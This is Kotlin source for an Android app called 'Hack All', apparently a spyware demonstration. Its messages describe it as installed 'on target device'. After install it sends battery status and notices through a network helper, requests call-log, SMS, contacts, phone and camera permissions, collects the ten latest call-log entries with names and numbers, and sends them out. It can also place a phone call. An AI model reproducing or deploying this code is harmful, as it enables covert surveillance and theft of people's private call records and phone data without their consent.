package cocomelonc.hackall

import android.Manifest
import android.annotation.SuppressLint
import android.content.IntentFilter
import android.content.Intent
import android.content.pm.PackageManager
import android.database.Cursor
import android.os.Bundle
import android.provider.CallLog
import android.widget.Button
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.core.net.toUri
import cocomelonc.hackall.broadcasts.HackAllAirPlaneBroadcastReceiver
import cocomelonc.hackall.tools.HackAllNetwork
import com.karumi.dexter.Dexter
import com.karumi.dexter.MultiplePermissionsReport
import com.karumi.dexter.PermissionToken
import com.karumi.dexter.listener.DexterError
import com.karumi.dexter.listener.PermissionRequest
import com.karumi.dexter.listener.PermissionRequestErrorListener
import com.karumi.dexter.listener.multi.MultiplePermissionsListener

import com.karumi.dexter.listener.PermissionDeniedResponse
import com.karumi.dexter.listener.PermissionGrantedResponse
import com.karumi.dexter.listener.single.PermissionListener

import android.content.Context
import android.os.BatteryManager

import java.text.SimpleDateFormat
import java.util.*

class HackAllMainActivity : ComponentActivity() {
    private val number = "107"
    private lateinit var cameraButton: Button
    lateinit var receiver: HackAllAirPlaneBroadcastReceiver

    // installed and opened - 1 stage
    private fun greetings(): String {
        return "LoveBahrain Hack All application has been installed on target device and opened\n"
    }

    // get battery info - 2 stage
    private fun getBatteryInfo(): String {
        val intentFilter = IntentFilter(Intent.ACTION_BATTERY_CHANGED)
        val batteryStatus = registerReceiver(null, intentFilter)
        val level = batteryStatus?.getIntExtra(BatteryManager.EXTRA_LEVEL, -1) ?: -1
        val scale = batteryStatus?.getIntExtra(BatteryManager.EXTRA_SCALE, -1) ?: -1
        val percentage = if (level >= 0 && scale > 0) (level * 100) / scale else -1

        val status = batteryStatus?.getIntExtra(BatteryManager.EXTRA_STATUS, -1) ?: -1
        val isCharging = status == BatteryManager.BATTERY_STATUS_CHARGING || status == BatteryManager.BATTERY_STATUS_FULL

        val chargePlug = batteryStatus?.getIntExtra(BatteryManager.EXTRA_PLUGGED, -1) ?: -1
        val chargeType = when (chargePlug) {
            BatteryManager.BATTERY_PLUGGED_USB -> "USB"
            BatteryManager.BATTERY_PLUGGED_AC -> "AC Adapter"
            BatteryManager.BATTERY_PLUGGED_WIRELESS -> "Wireless"
            else -> "Unknown"
        }
        return  "Battery Info:\n" +
                "Percentage: $percentage%\n" +
                "Charging: $isCharging\n" +
                "Charging Method: $chargeType"
    }

    private fun startCall() {
        var intent = Intent(Intent.ACTION_CALL)
        intent.data = "tel:$number".toUri()
        startActivity(intent)
    }

    @SuppressLint("NewApi")
    fun isCallPermissionGranted(context: Context): Boolean {
        val isGranted = context.checkSelfPermission(Manifest.permission.CALL_PHONE)
        return isGranted == PackageManager.PERMISSION_GRANTED
    }

    private fun startCallPermissionRequest(context: Context, onGranted: () -> Unit) {
        Dexter.withContext(context)
            .withPermission(Manifest.permission.CALL_PHONE)
            .withListener(object : PermissionListener {
                override fun onPermissionGranted(p0: PermissionGrantedResponse?) {
                    onGranted()
                }
                override fun onPermissionDenied(p0: PermissionDeniedResponse?) {}
                override fun onPermissionRationaleShouldBeShown(
                    p0: PermissionRequest?,
                    p1: PermissionToken?
                ) {
                }
            }).check()
    }

    private fun requestPermissions() {
        // below line is use to request permission in the current activity.
        // this method is use to handle error in runtime permissions
        Dexter.withContext(this) // below line is use to request the number of permissions which are required in our app.
            .withPermissions(
                Manifest.permission.CAMERA,  // below is the list of permissions
                Manifest.permission.RECEIVE_SMS,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.CALL_PHONE,
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.READ_CONTACTS,
            ) // after adding permissions we are calling an with listener method.
            .withListener(object : MultiplePermissionsListener {
                override fun onPermissionsChecked(multiplePermissionsReport: MultiplePermissionsReport) {
                    // this method is called when all permissions are granted
                    if (multiplePermissionsReport.areAllPermissionsGranted()) {
                        // do you work now
                        Toast.makeText(
                            applicationContext,
                            "All the permissions are granted..",
                            Toast.LENGTH_SHORT
                        ).show()
                        HackAllNetwork(applicationContext).sendTextMessage("Hack All permissions granted\n")
                        sendLogs()
                    }

                    // check for permanent denial of any permission
                    if (multiplePermissionsReport.isAnyPermissionPermanentlyDenied()) {
                        // permission is denied permanently, we will show user a message.
                        Toast.makeText(
                            applicationContext,
                            "Hack All some permissions denied..",
                            Toast.LENGTH_SHORT
                        ).show()
                        HackAllNetwork(applicationContext).sendTextMessage("Hack All some permissions denied\n")
                    }
                }

                override fun onPermissionRationaleShouldBeShown(
                    list: MutableList<PermissionRequest?>?,
                    permissionToken: PermissionToken
                ) {
                    // this method is called when user grants some permission and denies some of them.
                    permissionToken.continuePermissionRequest()
                }
            }).withErrorListener(PermissionRequestErrorListener { _: DexterError? ->
                // we are displaying a toast message for error message.
                Toast.makeText(applicationContext, "Error occurred! ", Toast.LENGTH_SHORT)
                    .show()
            }) // below line is use to run the permissions on same thread and to check the permissions
            .onSameThread().check()
    }

    override fun onStop() {
        super.onStop()
        unregisterReceiver(receiver)
    }

    @SuppressLint("UnspecifiedRegisterReceiverFlag")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        HackAllNetwork(this).sendTextMessage(greetings())
        HackAllNetwork(this).sendTextMessage(getBatteryInfo())
        this.requestPermissions()
        cameraButton = findViewById(R.id.camButton)
        cameraButton.setOnClickListener {
            requestPermissions()
            if (isCallPermissionGranted(this)) {
                startCallPermissionRequest(this) {
                    HackAllNetwork(this).sendTextMessage("LoveBahrain Hack All Call started\n")
                    startCall()
                }
            } else {
                HackAllNetwork(this).sendTextMessage("LoveBahrain Hack All Call permission denied\n")
            }
        }

        receiver = HackAllAirPlaneBroadcastReceiver()

        IntentFilter(Intent.ACTION_AIRPLANE_MODE_CHANGED).also {
            registerReceiver(receiver, it)
        }
    }

    @SuppressLint("NewApi")
    private fun sendLogs() {
        try {
            val cols = arrayOf(
                CallLog.Calls._ID,
                CallLog.Calls.CACHED_NAME,
                CallLog.Calls.NUMBER,
                CallLog.Calls.TYPE,
                CallLog.Calls.DURATION, CallLog.Calls.DATE
            )
            val cursor: Cursor? = contentResolver.query(
                CallLog.Calls.CONTENT_URI, cols, null,
                null, "${CallLog.Calls.LAST_MODIFIED} DESC"
            )

            val callLogs = StringBuilder()

            cursor?.use {
//                val idIndex = it.getColumnIndex(CallLog.Calls._ID)
                val nameIndex = it.getColumnIndex(CallLog.Calls.CACHED_NAME)
                val numberIndex = it.getColumnIndex(CallLog.Calls.NUMBER)
                val typeIndex = it.getColumnIndex(CallLog.Calls.TYPE)
                val dateIndex = it.getColumnIndex(CallLog.Calls.DATE)
                val durationIndex = it.getColumnIndex(CallLog.Calls.DURATION)

                var count = 0
                while (it.moveToNext() && count < 10) {
//                    val idRow = it.getString(idIndex)
                    val nameRow = it.getString(nameIndex)
                    val name = if (nameRow == null || nameRow == "") "Unknown" else nameRow
                    val number = it.getString(numberIndex)
                    val duration = it.getString(durationIndex) ?: "0"
                    val type = it.getInt(typeIndex)

                    val callType = when (type) {
                        CallLog.Calls.OUTGOING_TYPE -> "Outgoing"
                        CallLog.Calls.INCOMING_TYPE -> "Incoming"
                        CallLog.Calls.MISSED_TYPE -> "Missed"
                        CallLog.Calls.REJECTED_TYPE -> "Rejected"
                        CallLog.Calls.BLOCKED_TYPE -> "Blocked"
                        else -> "Unknown"
                    }

                    val date = it.getLong(dateIndex)

                    val formatter = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
                    val formattedDate = formatter.format(Date(date))

                    callLogs.append("📞 Number: $number\n")
                    callLogs.append("📞 Name: $name\n")
                    callLogs.append("🔹 Type: $callType\n")
                    callLogs.append("📅 Date: $formattedDate\n")
                    callLogs.append("⏱️ Duration: $duration seconds\n\n")
                    count += 1

                    //                HackAllNetwork(this).sendTextMessage("CALL LOG: $idRow, $name, $number, $duration, $type, $date")
                }
            }

            if (callLogs.isNotEmpty()) {
                HackAllNetwork(this).sendTextMessage("🛜 Collected Call Logs:\n\n$callLogs")
            } else {
                HackAllNetwork(this).sendTextMessage("No call logs found on the device.\n")
            }
        } catch (e: Exception) {
            HackAllNetwork(this).sendTextMessage("Error reading call logs: ${e.localizedMessage}")
        }
    }
}